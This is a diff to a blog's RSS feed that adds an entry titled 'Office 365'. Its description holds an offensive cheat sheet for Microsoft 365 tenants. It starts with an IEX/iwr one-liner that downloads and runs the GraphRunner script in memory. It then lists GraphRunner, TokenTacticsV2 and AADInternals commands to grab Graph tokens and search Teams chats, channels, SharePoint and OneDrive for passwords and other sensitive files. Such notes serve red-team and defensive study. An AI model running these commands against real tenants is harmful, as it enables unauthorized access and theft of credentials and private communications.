@@ -11,6 +11,13 @@
     <atom:link href="https://kafka-esc.com/tags/blog/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Office 365</title>
+      <link>https://kafka-esc.com/copilot-conversations/office-365/</link>
+      <pubDate>Sat, 07 Sep 2024 00:00:00 +0000</pubDate>
+      <guid>https://kafka-esc.com/copilot-conversations/office-365/</guid>
+      <description>GraphRunner Import into memory&#xA;IEX (iwr &amp;#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&amp;#39;) Get-GraphTokens User and Password Get-GraphTokens –UserPasswordAuth Microsoft Teams Messages GraphRunner Chat&#xA;Search:&#xA;Invoke-SearchTeams -Tokens $tokens -SearchTerm password Dump:&#xA;Invoke-SearchTeams -Tokens $tokens -SearchTerm password Get-TeamsChat -Tokens $tokens Channels&#xA;Get-TeamsChannels Find-ChannelEmails TokenTacticsV2 RefreshTo-MSTeamsToken -domain domain.local AADInternals Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName Sharepoint and OneDrive Files GraphRunner Search:&#xA;Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &amp;#39;bonus&amp;#39; MgGraph $userId = &amp;#34;&amp;lt;user-id&amp;gt;&amp;#34; Import-Module Microsoft.Graph.Files Get-MgUserDefaultDrive -UserId $userId Get-MgUserDrive -UserId $UserId -Debug Get-MgDrive -top 1 Powershell code to retrieve the user’s chat messages:</description>
+    </item>
+    <item>
+      <title>Office 365</title>
       <link>https://kafka-esc.com/posts/2024/09/office-365/</link>
       <pubDate>Sat, 07 Sep 2024 00:00:00 +0000</pubDate>
       <guid>https://kafka-esc.com/posts/2024/09/office-365/</guid>
